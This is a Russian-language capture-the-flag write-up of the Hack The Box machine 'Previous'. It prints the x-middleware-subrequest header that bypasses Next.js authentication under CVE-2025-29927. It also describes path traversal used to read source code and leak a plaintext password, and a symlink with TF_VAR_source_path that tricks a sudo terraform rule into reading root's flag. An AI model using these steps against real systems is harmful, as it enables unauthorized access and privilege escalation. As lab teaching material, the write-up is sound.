<div class="htb-box-info medium">
  <div class="box-header">
    <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/f34c6756e7c75b48ec112831eb27940a.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Linux</td></tr>
        <tr><td>Difficulty:</td><td>Medium</td></tr>
        <tr><td>Release:</td><td>23 Aug 2025</td></tr>
      </table>
    </div>
  </div>
</div>

# user flag
### enumeration
Начинаем со скана открытых портов. Видим только 2 порта:
```
nmap -p- --min-rate 1000 -v 10.129.242.162

OUTPUT:
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Узнаем побольше информации о них. Видим, что нас перенаправляют на домен `previous.htb`. Запишем в `/etc/hosts`.
```
nmap -p 22,80 -sC -sV -vv 10.129.242.162

OUTPUT:
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; 
...SNIP...
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Переходя на сайт, видим вот такую страницу. 
![[Pasted image 20260424092558.png]]

Пробуем перейти на какую-либо страницу, нас перенаправляют на:
![[Pasted image 20260427150455.png]]
Пробовал дефолтные креды — не получилось.

Посмотрев на запрос, я заметил `next-auth` куку:
![[Pasted image 20260427150725.png]]
Затем я подтвердил это с помощью расширения `wappalyzer` — оно показало `next.js 15.2.2`. Я начал искать CVE для этой версии и нашел [CVE-2025-29927](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass). Суть в том, что Next.js использует middleware — код, который выполняется до основного запроса. Если добавить в запрос заголовок `x-middleware-subrequest` с определённым значением, middleware просто пропускается, и любая проверка авторизации скипается.

Достаточно добавить заголовок:
```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```
После этого открывается доступ к страницам, которые раньше были закрыты.

Перехожу на страницу `/docs` и вижу следующее:
![[Pasted image 20260427165851.png]]

на странице `/docs/examples` можно скачать пример:
![[Pasted image 20260427165950.png]]
![[Pasted image 20260427170116.png]]

Первое, что приходит в голову при функции скачивания — path traversal.
![[Pasted image 20260427170218.png]]
Уязвимость подтверждается. Нужно найти что-то, что даст доступ к системе. Загуглив структуру типового Next.js приложения, я нашел это:
![[Pasted image 20260427170620.png]]
![[Pasted image 20260427170636.png]]

Я попросил [gemini-3-flash](https://arena.ai) построить структуру, основываясь на данном выше файле. Я нашел следующий критически важный файл:
![[Pasted image 20260427171305.png]]

Я нашел учетку пользователя `jeremy` с паролем `MyNameIsJeremyAndILovePancakes`
```
authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})
```

Подключаемся по `ssh` и достаем user flag.
![[Pasted image 20260427124757.png]]

# root
### enumeration
```bash
> sudo -l

OUTPUT:
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Мы можем запускать `terraform` как `root`. `!env_reset` означает, что мы можем устанавливать переменные окружения, но не можем менять переменную `PATH`.

Дальше я попробовал запустить бинарник:
```bash
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

No changes. Your infrastructure matches the configuration.

Terraform has compared your real infrastructure against your configuration and found no differences, so no changes are needed.

Apply complete! Resources: 0 added, 0 changed, 0 destroyed.

Outputs:
destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
```

В директории `/opt/examples/`:
![[Pasted image 20260427172058.png]]

Файл `main.tf`. Конфиг для terraform-а. По сути он берет файл `/root/examples/hello-world.ts` и записывает его в доступную нам директорию. Мы также можем поменять файл, который мы хотим записать. Но этот файл должен содержать `/root/examples/` и не иметь `..`. 
```
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}

```

### exploatation

Создам симлинк на `/root/root.txt` в папке `/tmp/root/examples/`:
```bash
mkdir -p /tmp/root/examples
ln -s /root/root.txt /tmp/root/examples/pwn
```

Валидация в `main.tf` проверяет, что строка `source_path` содержит `/root/examples/` и не содержит `..`. Но она проверяет именно строку, а не конечный путь в файловой системе. Путь `/tmp/root/examples/pwn` содержит подстроку `/root/examples/` — валидация проходит. А так как `/tmp/root/examples` — это директория (не симлинк), а сам файл `pwn` — симлинк на `/root/root.txt`, Terraform послушно прочитает root-флаг.

Чтобы Next.js принял переменную, добавляю префикс `TF_VAR_`:
```bash
export TF_VAR_source_path="/tmp/root/examples/pwn"
```

Запускаю ещё раз:
```bash
sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

Получаю root-флаг.
![[Pasted image 20260427172630.png]]
